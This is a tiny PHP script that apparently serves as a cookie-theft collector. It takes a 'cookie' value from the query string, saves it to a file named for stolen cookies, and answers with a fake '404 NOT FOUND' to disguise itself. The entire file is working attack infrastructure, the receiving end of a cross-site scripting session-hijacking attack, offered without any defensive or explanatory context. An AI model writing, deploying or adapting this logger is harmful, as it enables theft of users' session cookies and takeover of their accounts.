<?php

if(isset($_GET["cookie"])){

	$cookie=$_GET["cookie"];

	file_put_contents('calinmis_cookie.txt', $cookie);
}

echo "404 NOT FOUND";

?>